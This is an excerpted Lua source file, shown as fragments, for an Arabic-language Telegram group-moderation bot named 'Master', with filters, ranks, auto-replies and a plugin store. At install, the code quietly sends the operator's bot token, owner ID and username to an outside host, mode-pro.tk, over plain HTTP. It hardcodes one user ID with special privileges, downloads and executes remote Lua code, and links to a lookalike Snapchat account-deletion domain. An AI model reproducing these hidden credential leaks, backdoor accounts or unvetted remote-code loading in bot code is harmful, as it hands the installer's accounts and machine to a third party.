...
https.request('http://mode-pro.tk/masterr/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
print('\n\27[1;34m doneeeeeeee senddddddddddddd :')
file = io.open("masterr", "w")  
file:write([[
#!/usr/bin/env bash
cd $HOME/masterr
token="]]..database:get(id_server..":token")..[["
...
echo -e "\033[0;00m"
echo -e "\e[36m"
./tg -s ./masterr.lua -p PROFILE --bot=$token
done
]])  
file:close()  
file = io.open("Mon", "w")  
...
while(true) do
rm -fr ../.telegram-cli
screen -S masterr -X kill
screen -S masterr ./masterr
done
]])  
file:close() 
...
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/masterr-TEAM/Files_masterr/main/File_Bot/commands.lua") 
...
if tonumber(user_id) == tonumber(1539693686) then  
var = true  
...
local UserName = (data.username_ or "TSBll")
...
local masterr_Msg = ''  
if msgs < 100 then 
masterr_Msg = 'غير متفاعل' 
elseif msgs < 200 then 
masterr_Msg = 'بده يتحسن' 
elseif msgs < 400 then 
masterr_Msg = 'شبه متفاعل' 
elseif msgs < 700 then 
masterr_Msg = 'متفاعل' 
elseif msgs < 1200 then 
masterr_Msg = 'متفاعل قوي' 
elseif msgs < 2000 then 
masterr_Msg = 'متفاعل جدا' 
elseif msgs < 3500 then 
masterr_Msg = 'اقوى تفاعل'  
elseif msgs < 4000 then 
masterr_Msg = 'متفاعل نار' 
elseif msgs < 4500 then 
masterr_Msg = 'قمة التفاعل'
elseif msgs < 5500 then 
masterr_Msg = 'اقوى متفاعل' 
elseif msgs < 7000 then 
masterr_Msg = 'ملك التفاعل' 
elseif msgs < 9500 then 
masterr_Msg = 'امبروطور التفاعل' 
elseif msgs < 10000000000 then 
masterr_Msg = 'رب التفاعل'  
end 
return masterr_Msg 
end
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"𝗠𝗔𝗦𝘁𝗲𝗿 ")  
...
function plugin_masterr(msg)
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
plugin = dofile("File_Bot/"..v)
if plugin.masterr and msg then
pre_msg = plugin.masterr(msg)
end
end
end
...
--------------------------------------------------------------------------------------------------------------
function Sourcemasterr(msg,data) -- بداية العمل
if msg then
...
send(msg.chat_id_, msg.id_,masterr_Msg) 
return false  
end 
if text then    
...
os.execute('rm -rf masterr.lua')
os.execute('wget https://raw.githubusercontent.com/masterrTEAM/masterr/main/masterr.lua')
...
-------------
if text == "꙳. تحديثات سورس ماستر ꙳." and Devmode(msg) then  
local updatech =[[
*يجب عليك الاشتراك في قناة*
*تحديثات وشروحات سورس ماستر*
*قم بالضغط في الاسفل ليحولك الئ القناة*
]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝗠𝗔𝗦𝘁𝗲𝗿 ࿐', url="t.me/wooooo"}},
}
...
send(msg.chat_id_, msg.id_,'꙳.︙عدد الكروبات الان » { '..#group..' }'..masterrk..''..masterr..'\n꙳.︙الان عدد الكروبات الحقيقي » { '..sendok..' } كروبات\n')   
end
end
end,nil)
end
...
usertext = '\n ꙳.︙العضو » ['..result.title_..'](t.me/'..(username or 'TSBll')..')'
status  = '\n ꙳.︙تم ترقيته مطور'
...
usertext = '\n ꙳.︙العضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TSBll')..')'
status  = '\n ꙳.︙تم ترقيته مطور'
...
local masterr1_Msg = database:get(bot_id.."masterr1:Add:Filter:Rp2"..text..msg.chat_id_)   
if masterr1_Msg then 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꙳.︙العضو » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'TSBll')..') \n ꙳.︙'..masterr1_Msg)
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
end,nil)
end
...
--------------------------------------------------------------------------------------------------------------
if masterr_Msg and not Special(msg) then  
local masterr_Msg = database:get(bot_id.."Add:Filter:Rp2"..text..msg.chat_id_)   
if masterr_Msg then    
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ꙳.︙["..masterr_Msg.."] \n")
else
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/TSBll)}\n ꙳.︙["..masterr_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ꙳.︙عذرا » {["..data.first_name_.."](T.ME/TSBll)}\n ꙳.︙عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
database:sadd(bot_id.."masterr:blocname"..msg.chat_id_, BlNe)
end
...
local All_name = database:smembers(bot_id.."masterr:blocname"..msg.chat_id_)
...
if name_MRmode then 
names_MRmode = database:smembers(bot_id.."masterr:blocname"..msg.chat_id_) or ""
...
database:set(bot_id.."masterr:teh"..msg.chat_id_,teh)
end
...
database:set(bot_id.."masterr:nump"..msg.chat_id_,nump)
end
if text == "التوحيد" then
local s1 = database:get(bot_id.."masterr:teh"..msg.chat_id_) or "لا يوجد توحيد"
local s2 = database:get(bot_id.."masterr:nump"..msg.chat_id_) or 5
...
if database:get(bot_id.."kt:twh:stats"..msg.chat_id_) == "open"  and database:get(bot_id.."masterr:teh"..msg.chat_id_) then 
id = msg.sender_user_id_
function mode_mrmode_new(mrmode1,mrmode2)
if mrmode2 and mrmode2.first_name_ then 
if mrmode2.first_name_:match("(.*)"..database:get(bot_id.."masterr:teh"..msg.chat_id_).."(.*)") then 
database:srem(bot_id.."masterr:Muted:User"..msg.chat_id_, msg.sender_user_id_)
else
local mrmode_nnn = database:get(bot_id.."masterr:nump"..msg.chat_id_) or 5
local mrmode_nnn2 = database:get(bot_id.."masterr:nump22"..msg.chat_id_..msg.sender_user_id_) or 0
if (tonumber(mrmode_nnn2) == tonumber(mrmode_nnn) or tonumber(mrmode_nnn2) > tonumber(mrmode_nnn)) then 
database:sadd(bot_id..'Muted:User'..msg.chat_id_, msg.sender_user_id_)
else 
database:incrby(bot_id.."masterr:nump22"..msg.chat_id_..msg.sender_user_id_,1)
send(msg.chat_id_, msg.id_, "꙳.︙عزيزي >>["..mrmode2.username_.."](https://t.me/"..(mrmode2.username_ or "TSBll")..")\n꙳.︙عليك وضع التوحيد ⪼ {"..database:get(bot_id.."masterr:teh"..msg.chat_id_).."} بجانب اسمك\n꙳.︙عدد المحاولات المتبقيه {"..(tonumber(mrmode_nnn) - tonumber(mrmode_nnn2)).."}")
end
end
end
end
...
local masterrChengName = database:get(bot_id.."masterr:Cheng:Name"..data.id_)
if not data.first_name_ then 
if masterrChengName then 
send(msg.chat_id_, msg.id_, " خوش معرف جان ["..masterrChengName..']')
database:del(bot_id.."masterr:Cheng:Name"..data.id_) 
end
end
if data.first_name_ then 
if masterrChengName ~= data.first_name_ then 
local Text = {
  "جان خوش اسم يول",
...
database:set(bot_id.."masterr:Cheng:Name"..data.id_, data.first_name_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then
local masterrChengUserName = database:get(bot_id.."masterr:Cheng:UserName"..data.id_)
if not data.username_ then 
if masterrChengUserName then 
send(msg.chat_id_, msg.id_, 1, "حذف معرفه خمطو بساع بساع  \n هاذه معرفه  : [@"..masterrChengUserName..']')
database:del(bot_id.."masterr:Cheng:UserName"..data.id_) 
end
end
if data.username_ then 
if masterrChengUserName ~= data.username_ then 
local Text = {
...
database:set(bot_id.."masterr:Cheng:UserName"..data.id_, data.username_) 
end
end
end
end,nil)   
...
if data.id_ then 
if data.id_ ~= bot_id then 
local masterrChengPhoto = database:get(bot_id.."masterr:Cheng:Photo"..data.id_)
if not data.profile_photo_ then 
if masterrChengPhoto then 
send(msg.chat_id_, msg.id_, "حذف كل صور ابن الحلو شكد غبي لعد😂🥺")
database:del(bot_id.."masterr:Cheng:Photo"..data.id_) 
end
end
if data.profile_photo_.big_.persistent_id_ then 
if masterrChengPhoto ~= data.profile_photo_.big_.persistent_id_ then 
local Text = {
...
database:set(bot_id.."masterr:Cheng:Photo"..data.id_, data.profile_photo_.big_.persistent_id_) 
end
end
end
end,nil)  
...
Text = "𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝗠𝗔𝗦𝘁𝗲𝗿\n\n[𝗠𝗔𝗦𝘁𝗲𝗿 ࿐ ](http://t.me/TSBll)\n\n[𝙙𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧 ](http://t.me/wooooo)\n\n[𝙏𝙬𝙎 𝙎𝙤𝙪𝙧𝙘𝙚 ](http://t.me/lFQBOT)"
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝘿𝙚𝙫 𝗠𝗔𝗦𝘁𝗲𝗿 .',url="https://t.me/wooooo"}},
}
local msg_id = msg.id_/2097152/0.5
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' ꙳.︙بواسطه » ['..Rutba(msg.sender_user_id_,msg.chat_id_)..'](T.ME/'..(data.username_ or 'TSBll')..') \n ꙳.︙تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' ꙳.︙بواسطه » ['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'TSBll')..') \n ꙳.︙تـم قفـل التاك بالكتم ')
end,nil)   
...
if Devmode(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/masterr-TEAM/Files_masterr/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ꙳.︙اهلا بك في متجر ملفات ماستر\n ꙳.︙ملفات السورس ↓\n⋆ ┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉ ⋆\n\n"
local TextE = "\n⋆ ┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉ ⋆\n ꙳.︙علامة تعني { ✔️ } ملف مفعل\n ꙳.︙علامة تعني { ✖ } ملف معطل\n ꙳.︙قناة سورس ماستر ↓\n".." ꙳.︙[اضغط هنا لدخول](t.me/TSBll) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/masterr-TEAM/Files_masterr/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('masterr.lua')  
else
send(msg.chat_id_, msg.id_," ꙳.︙عذرا الملف لايدعم سورس ماستر \n") 
end
return false
end
...
local UserName = (b.username_ or "masterr-TEAM")
...
function Function_masterr(extra, result, success)
...
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_masterr, nil)
return false 
end
...
tdcli_function ({ID = "SearchPublicChat",username_ = username}, Function_masterr, nil)
return false 
end
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n ꙳.︙لعضو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TSBll')..')'
status  = '\n ꙳.︙تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n ꙳.︙العضو » '..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ꙳.︙العضــو » ['..data.first_name_..'](t.me/'..(data.username_ or 'TSBll')..')'
...
database:set(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"rep")  
return false  
end    
if text then   
local tsssst = database:get(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if tsssst == "rep" then   
send(msg.chat_id_, msg.id_," ꙳.︙ارسل التحذير عند ارسال الكلمه")  
database:set(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"repp")  
database:set(bot_id.."masterr1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_, text)  
database:sadd(bot_id.."masterr1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
if text then  
local test = database:get(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
if test == "repp" then  
send(msg.chat_id_, msg.id_," ꙳.︙تم منع الكلمه مع التحذير")  
database:del(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
local test = database:get(bot_id.."masterr1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
if text then   
database:set(bot_id.."masterr1:Add:Filter:Rp2"..test..msg.chat_id_, text)  
end  
database:del(bot_id.."masterr1:filtr1:add:reply2"..msg.sender_user_id_..msg.chat_id_)  
return false  end  
end

if text == "الغاء منع" and msg.reply_to_message_id_ == 0 and Manager(msg) then    
send(msg.chat_id_, msg.id_," ꙳.︙ارسل الكلمه الان")  
database:set(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_,"reppp")  
return false  end
if text then 
local test = database:get(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
...
database:del(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."masterr1:Add:Filter:Rp2"..text..msg.chat_id_)  
database:srem(bot_id.."masterr1:List:Filter"..msg.chat_id_,text)  
return false  end  
end
...
local list = database:smembers(bot_id.."masterr1:List:Filter"..msg.chat_id_)  
for k,v in pairs(list) do  
database:del(bot_id.."masterr1:Add:Filter:Rp1"..msg.sender_user_id_..msg.chat_id_)  
database:del(bot_id.."masterr1:Add:Filter:Rp2"..v..msg.chat_id_)  
database:srem(bot_id.."masterr1:List:Filter"..msg.chat_id_,v)  
end  
...
t = "\n ꙳.︙قائمة المنع \n⋆ ┉  ┉  ┉  ┉ ┉  ┉  ┉  ┉ ⋆\n"
for k,v in pairs(list) do  
local masterr_Msg = database:get(bot_id.."masterr1:Add:Filter:Rp2"..v..msg.chat_id_)   
t = t..""..k.."- "..v.." » {"..masterr_Msg.."}\n"    
end  
if #list == 0 then  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n ꙳.︙العضو » ['..result.title_..'](t.me/'..(text1[3] or 'TSBll')..')'..'\n ꙳.︙تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
send(msg.chat_id_, msg.id_,'['..masterr_Msg[math.random(#masterr_Msg)]..']') 
return false
end
...
------------------------------------------------------------------------
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_, '\n ꙳.︙ارسل الكلمه تريد اضافتها')
database:set(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_, "true1")
database:set(bot_id.."botss:masterr:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_, text)
database:sadd(bot_id.."botss:masterr:List:Rd:Sudo", text)
return false end
end
if text and text:match("^(.*)$") then
if database:get(bot_id.."botss:masterr:Set:On"..msg.sender_user_id_..":"..msg.chat_id_) == "true" then
send(msg.chat_id_, msg.id_,"꙳.︙تم حذف الرد من ردود المتعدده")
database:del(bot_id..'botss:masterr:Add:Rd:Sudo:Text'..text)
database:del(bot_id..'botss:masterr:Add:Rd:Sudo:Text1'..text)
database:del(bot_id..'botss:masterr:Add:Rd:Sudo:Text2'..text)
database:del(bot_id.."botss:masterr:Set:On"..msg.sender_user_id_..":"..msg.chat_id_)
database:srem(bot_id.."botss:masterr:List:Rd:Sudo", text)
return false
end
end
...
local list = database:smembers(bot_id.."botss:masterr:List:Rd:Sudo")
for k,v in pairs(list) do  
database:del(bot_id.."botss:masterr:Add:Rd:Sudo:Text"..v) 
database:del(bot_id.."botss:masterr:Add:Rd:Sudo:Text1"..v) 
database:del(bot_id.."botss:masterr:Add:Rd:Sudo:Text2"..v)   
database:del(bot_id.."botss:masterr:List:Rd:Sudo")
end
...
database:set(bot_id.."TSBll:insta_bot"..msg.chat_id_,"close")
end
if text == "تفعيل الانستا" and Manager(msg) then
send(msg.chat_id_, msg.id_,'꙳. تم تفعيل الانستا')
database:set(bot_id.."TSBll:insta_bot"..msg.chat_id_,"open")
end
if text and text:match("^معلومات (.*)$") and database:get(bot_id.."TSBll:insta_bot"..msg.chat_id_) == "open" then
...
database:set(bot_id.."TSBll:Tag:Admins:"..msg.chat_id_,true)
send(msg.chat_id_, msg.id_,"꙳.︙تم تفعيل تاك المشرفين")
end
if text and text == "تعطيل تاك المشرفين" and Manager(msg) then 
database:del(bot_id.."TSBll:Tag:Admins:"..msg.chat_id_)
...
if database:get(bot_id.."TSBll:Tag:Admins:"..msg.chat_id_) then 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,data)
...
end --الكود حصري سورس ماستر يعني لو بكتهن راح اعرفك انت الاخذتهن
...
database:set(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,true)
...
database:set(bot_id.."botss:masterr:Set:On"..msg.sender_user_id_..":"..msg.chat_id_,true)
return send(msg.chat_id_, msg.id_,"꙳.︙ارسل الان الكلمه لحذفها ")
end
if text then  
local test = database:get(bot_id.."botss:masterr:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "true1" then
database:set(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd1')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:masterr:Add:Rd:Sudo:Text"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:masterr:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd1" then
database:set(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd2')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:masterr:Add:Rd:Sudo:Text1"..test, text)  
end  
...
if text then  
local test = database:get(bot_id.."botss:masterr:Text:Sudo:Bot"..msg.sender_user_id_..":"..msg.chat_id_)
if database:get(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_) == "rd2" then
database:set(bot_id.."botss:masterr:Set:Rd"..msg.sender_user_id_..":"..msg.chat_id_,'rd3')
if text then   
text = text:gsub('"',"") 
text = text:gsub('"',"") 
text = text:gsub("`","") 
text = text:gsub("*","") 
database:set(bot_id.."botss:masterr:Add:Rd:Sudo:Text2"..test, text)  
end  
...
if text then
local Text = database:get(bot_id.."botss:masterr:Add:Rd:Sudo:Text"..text)   
local Text1 = database:get(bot_id.."botss:masterr:Add:Rd:Sudo:Text1"..text)   
local Text2 = database:get(bot_id.."botss:masterr:Add:Rd:Sudo:Text2"..text)   
...
------------------------------------------------------------------------
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'ماستر').." غادر" or text == 'بوت غادر' then  
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(extra,data) 
local rtp = Rutba(result.sender_user_id_,msg.chat_id_)
local username = ' ['..data.first_name_..'](t.me/'..(data.username_ or 'TSBll')..')'
local iduser = result.sender_user_id_
...
-- vardump(data) 
masterrdx(msg.chat_id_, msg.id_, ' ꙳.︙ايدي المجموعة » ( '..msg.chat_id_..' )\n ꙳.︙عدد الادمنيه » ( *'..data.administrator_count_..' )*\n ꙳.︙عدد المحظورين » ( *'..data.kicked_count_..' )*\n ꙳.︙عدد الاعضاء » ( *'..data.member_count_..' )*\n', 'md') 
end 
...
≪─━─━─𝙎𝙉━─━─≫
 ...
 ꙳. رابط حذف [Snspchat](https://accounts.masterrchat.com/accounts/login?continue=https%3A%2F%2Faccounts.masterrchat.com%2Faccounts%2Fdeleteaccount) ܁
]]
send(msg.chat_id_, msg.id_,t) 
return false
end
...
masterr = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(masterr)
...
--------------------------------------------------------------------------------------------------------------
Sourcemasterr(data.message_,data)
plugin_masterr(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
...
------------------------------------------------------------------------
local masterrAbot = database:get(bot_id.."masterr1:Add:Filter:Rp2"..text..result.chat_id_)   
if masterrAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ꙳.︙العضو : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ꙳.︙["..masterrAbot.."] \n") 
...
------------------------------------------------------------------------
if text then
local masterr1_Msg = database:get(bot_id.."masterr1:Add:Filter:Rp2"..text..result.chat_id_)   
if masterr1_Msg then    
send(msg.chat_id_, msg.id_," ꙳.︙"..masterr1_Msg)
